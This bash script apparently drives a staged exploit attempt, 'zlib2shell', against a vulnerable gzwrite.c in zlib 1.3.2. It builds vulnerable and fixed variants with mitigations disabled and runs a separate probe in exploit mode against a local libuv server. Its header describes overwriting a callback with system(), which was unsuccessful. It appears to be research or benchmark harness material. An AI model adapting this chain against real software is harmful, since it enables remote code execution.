#!/usr/bin/env bash
# zlib2shell W3 — reproducible author-side rung-5 attempt with a real libuv
# async-handle consumer. All sockets are plant-started 127.0.0.1 sockets.
# Result at staging time: peer bytes rewrite the handle's async_cb to system(),
# but libuv dispatch crashes on collateral heap corruption; no command marker.
set -euo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(dirname "$HERE")
SRC=$ROOT/src
OUT=$HERE/uv-evidence
mkdir -p "$OUT"
TRACE=$OUT/trace.txt
: > "$TRACE"

build() { # $1=variant $2=gzwrite source
    local d=/tmp/zlib2shell-uv-$1
    rm -rf "$d"; mkdir -p "$d"
    cp -r "$SRC/zlib-1.3.2/." "$d/"
    cp "$SRC/$2" "$d/gzwrite.c"
    (cd "$d" && CC=gcc CFLAGS='-g -O0 -fno-stack-protector' \
        ./configure --static >/dev/null 2>&1 && make -s -j4 >/dev/null 2>&1)
    gcc -g -O0 -fno-stack-protector -no-pie -I"$d" -I/usr/include \
        "$HERE/uv_server.c" "$d/libz.a" -luv -lpthread -ldl -o "$d/srv"
    echo "$d/srv"
}

log() { printf '%s\n' "$*" | tee -a "$TRACE"; }

VULN=$(build vuln gzwrite.c.parent)
FIXED=$(build fixed gzwrite.c.fixed)

rm -rf "$OUT/cal" "$OUT/vuln" "$OUT/fixed" "$OUT/safe"
log "== calibration =="
python3 "$HERE/uv_probe.py" --binary "$VULN" --out "$OUT/cal" \
    --mode calibrate --log "$OUT/cal.log" | tee -a "$TRACE" >/dev/null
DELTA=$(grep '^DELTA=' "$TRACE" | tail -1 | cut -d= -f2)
log "DELTA=$DELTA"

log "== vulnerable + stalled crafted peer =="
python3 "$HERE/uv_probe.py" --binary "$VULN" --out "$OUT/vuln" \
    --mode exploit --delta "$DELTA" --log "$OUT/vuln.log" > "$OUT/vuln.stdout" 2>&1
cat "$OUT/vuln.stdout" >> "$TRACE"
log "VULN_MARKER=$(grep '^MARKER=' "$OUT/vuln.stdout" | tail -1)"

log "== fixed + stalled crafted peer =="
python3 "$HERE/uv_probe.py" --binary "$FIXED" --out "$OUT/fixed" \
    --mode exploit --delta "$DELTA" --log "$OUT/fixed.log" > "$OUT/fixed.stdout" 2>&1
cat "$OUT/fixed.stdout" >> "$TRACE"
log "FIXED_MARKER=$(grep '^MARKER=' "$OUT/fixed.stdout" | tail -1)"

log "== vulnerable + draining peer =="
python3 "$HERE/uv_probe.py" --binary "$VULN" --out "$OUT/safe" \
    --mode safe --delta "$DELTA" --log "$OUT/safe.log" > "$OUT/safe.stdout" 2>&1
cat "$OUT/safe.stdout" >> "$TRACE"
log "SAFE_MARKER=$(grep '^MARKER=' "$OUT/safe.stdout" | tail -1)"

sha256sum "$TRACE" | tee -a "$TRACE"
